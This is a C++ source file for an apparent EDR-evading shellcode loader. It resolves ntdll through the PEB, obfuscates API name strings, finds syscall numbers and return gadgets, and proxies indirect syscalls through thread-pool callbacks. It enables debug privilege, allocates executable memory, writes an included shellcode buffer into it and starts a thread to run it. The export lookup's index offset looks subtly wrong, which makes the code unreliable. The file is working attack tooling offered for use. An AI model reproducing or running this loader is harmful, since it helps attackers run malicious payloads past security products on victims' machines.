#include "Callbacks.h"
#include "Shellcode.h"
#include "PEB.h"
#include <iostream>
#include <winternl.h>

typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

FARPROC pTpAllocWork;
FARPROC pTpPostWork;
FARPROC pTpReleaseWork;
HMODULE hNtdll;

extern "C" DWORD GetSSNByFuncAddress(HANDLE functionAddress);

HMODULE GetNtdllHandle() {
    #if defined(_WIN64)
        PPEB Peb = (PPEB)__readgsqword(0x60);
    #else
        PPEB Peb = (PPEB)__readfsdword(0x30);
    #endif

    PLDR_MODULE pLoadModule;
    pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 16);

    return (HMODULE)pLoadModule->BaseAddress;
}

VOID EnableDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken))
    {
        std::cerr << "EnableDebugPrivilege: OpenProcessToken failed, err=" 
                  << GetLastError() << std::endl;
        return;
    }

    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
    {
        std::cerr << "EnableDebugPrivilege: LookupPrivilegeValue failed, err=" 
                  << GetLastError() << std::endl;
        CloseHandle(hToken);
        return;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr))
    {
        std::cerr << "EnableDebugPrivilege: AdjustTokenPrivileges failed, err=" 
                  << GetLastError() << std::endl;
    }
    CloseHandle(hToken);
}

PIMAGE_EXPORT_DIRECTORY GetExportTableAddress(HMODULE ImageBase) {
    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(ImageBase);

    uintptr_t dosHeaderAddr = baseAddress;
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(dosHeaderAddr);

    uintptr_t peHeaderAddr = baseAddress + dosHeader->e_lfanew;
    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(peHeaderAddr);

    IMAGE_EXPORT_DIRECTORY* exportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    return (PIMAGE_EXPORT_DIRECTORY)exportDir;
}

HANDLE GetExportFunctionAddress(HMODULE moduleHandle, PIMAGE_EXPORT_DIRECTORY exportDir, const char* functionName) {
    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(moduleHandle);
    DWORD* addressOfFunctions = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfFunctions);
    DWORD numberOfFunctions = exportDir->NumberOfFunctions;

    DWORD* addressOfNameOrdinals = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfNameOrdinals);
    DWORD* addressOfNames = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfNames);

    uintptr_t functionAddress = 0;

    for (DWORD i = 0; i < numberOfFunctions; ++i) {
        const char* currentFunctionName = nullptr;

        if (i < exportDir->NumberOfNames) {
            currentFunctionName = reinterpret_cast<const char*>(baseAddress + addressOfNames[i]);
        }

        functionAddress = baseAddress + addressOfFunctions[i+1];

        if (currentFunctionName && strcmp(currentFunctionName, functionName) == 0) {
            functionAddress = functionAddress;
            return (HANDLE)functionAddress;
        }
    }

    return (HANDLE)-1;
}

DWORD GetSSN(const char* functionName) {
    HMODULE hNtdll = GetNtdllHandle();

    PIMAGE_EXPORT_DIRECTORY exportTable = GetExportTableAddress(hNtdll);

    HANDLE functionAddress = GetExportFunctionAddress(hNtdll, exportTable, functionName);

    DWORD SSN = GetSSNByFuncAddress(functionAddress);

    return SSN;
}

VOID initVariables() {
    unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
    hNtdll = GetNtdllHandle();

    Search_For_Syscall_Ret(hNtdll);
    Search_For_Add_Rsp_Ret(hNtdll);

    unsigned char sTpAllocWork[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k' , 0x0 };
    pTpAllocWork = GetProcAddress(hNtdll, (LPCSTR)sTpAllocWork);

    unsigned char sTpPostWork[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k' , 0x0 };
    pTpPostWork = GetProcAddress(hNtdll, (LPCSTR)sTpPostWork);

    unsigned char sTpReleaseWork[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0x0 };
    pTpReleaseWork = GetProcAddress(hNtdll, (LPCSTR)sTpReleaseWork);
}

VOID setCallback(PTP_WORK_CALLBACK callback, PVOID args) {
    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)callback, args, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
}

PVOID NtAllocateVirtualMemory(HANDLE hProcess) {
    PVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = 0x1000;

    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.hProcess = hProcess;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.zeroBits = 0;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.allocationType = (MEM_RESERVE | MEM_COMMIT);
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
    ntAllocateVirtualMemoryArgs.ssn = GetSSN("NtAllocateVirtualMemory");

    setCallback((PTP_WORK_CALLBACK)NtAllocateVirtualMemory_Callback, &ntAllocateVirtualMemoryArgs);

    return allocatedAddress;
}

VOID NtWriteVirtualMemory(HANDLE hProcess, PVOID allocatedAddress, PULONG bytesWritten) {
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.hProcess = hProcess;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = code;
    ntWriteVirtualMemoryArgs.numberOfBytesToWrite = sizeof(code);
    ntWriteVirtualMemoryArgs.numberOfBytesWritten = bytesWritten;
    ntWriteVirtualMemoryArgs.ssn = GetSSN("NtWriteVirtualMemory");

    setCallback((PTP_WORK_CALLBACK)NtWriteVirtualMemory_Callback, &ntWriteVirtualMemoryArgs);
}

VOID NtCreateThreadEx(HANDLE hProcess, HANDLE hThread, PVOID allocatedAddress) {
    NTCREATETHREADEX_ARGS ntCreateThreadExArgs = { 0 };
    ntCreateThreadExArgs.threadHandle = &hThread;
    ntCreateThreadExArgs.desiredAccess = GENERIC_EXECUTE;
    ntCreateThreadExArgs.objectAttributes = NULL;
    ntCreateThreadExArgs.processHandle = hProcess;
    ntCreateThreadExArgs.lpStartAddress = allocatedAddress;
    ntCreateThreadExArgs.lpParameter = NULL;
    ntCreateThreadExArgs.flags = FALSE;
    ntCreateThreadExArgs.stackZeroBits = 0;
    ntCreateThreadExArgs.sizeOfStackCommit = 0;
    ntCreateThreadExArgs.sizeOfStackReserve = 0;
    ntCreateThreadExArgs.lpBytesBuffer = NULL;
    ntCreateThreadExArgs.ssn = GetSSN("NtCreateThreadEx");

    setCallback((PTP_WORK_CALLBACK)NtCreateThreadEx_Callback, &ntCreateThreadExArgs);
}


int main() {

    EnableDebugPrivilege();
    
    initVariables();

    HANDLE hProcess = (HANDLE)-1;

    std::cout << "[*] Executing NtAllocateVirtualMemory..." << std::endl;
    PVOID allocatedAddress = NtAllocateVirtualMemory(hProcess);
    std::cout << "\t[+] Allocated at: 0x" << allocatedAddress << std::endl;

    ULONG writenSize = 0;
    std::cout << "[*] Executing NtWriteVirtualMemory..." << std::endl;
    NtWriteVirtualMemory(hProcess, allocatedAddress, &writenSize);

    HANDLE hThread = NULL;
    std::cout << "[*] Executing NtCreateThreadEx..." << std::endl;
    NtCreateThreadEx(hProcess, hThread, allocatedAddress);

    //WaitForSingleObject(hThread, 0x1000);

    return 0;
}
